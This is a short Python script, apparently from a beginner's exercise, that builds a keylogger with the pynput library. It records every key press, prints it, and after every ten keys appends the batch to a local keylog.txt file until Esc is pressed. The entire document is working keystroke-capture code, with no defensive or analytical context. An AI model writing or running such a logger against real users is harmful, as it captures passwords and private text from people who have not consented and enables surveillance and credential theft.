#!/usr/bin/env python3
# CREATING A KEY LOGGER
import pynput
from pynput.keyboard import Key, Listener

# Now I need to make this useful in a meaningful way. I need
# to be able to save the key presses to a text file.
count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("keylog.txt", "a") as f:
        for key in keys:
            f.write(str(key))


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
